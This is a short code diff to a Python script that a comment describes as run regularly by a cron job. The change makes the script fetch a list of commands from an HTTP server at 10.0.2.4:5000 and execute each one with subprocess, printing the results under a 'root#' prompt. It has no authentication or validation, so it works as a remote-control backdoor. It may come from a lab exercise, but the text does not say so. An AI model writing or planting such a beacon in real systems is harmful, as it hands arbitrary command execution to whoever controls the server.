@@ -1,8 +1,15 @@
 # python file that gets run every so often by our cron job
-import requests
+import subprocess, os, requests
 
-host = "10.0.2.4"
+host = "http://10.0.2.4:5000"
 
 
-res = requests.get(host+"/commands")
-print(res)
+cmds = requests.get(host+"/commands").json()
+
+print("---- Running commands -----")
+for cmd in cmds:
+    print("\n")
+    print("root#", cmd)
+    process = subprocess.Popen(cmd.split(), stdout=subprocess.PIPE)
+    output, error = process.communicate()
+    print(output.decode("utf-8"), error, "\n")
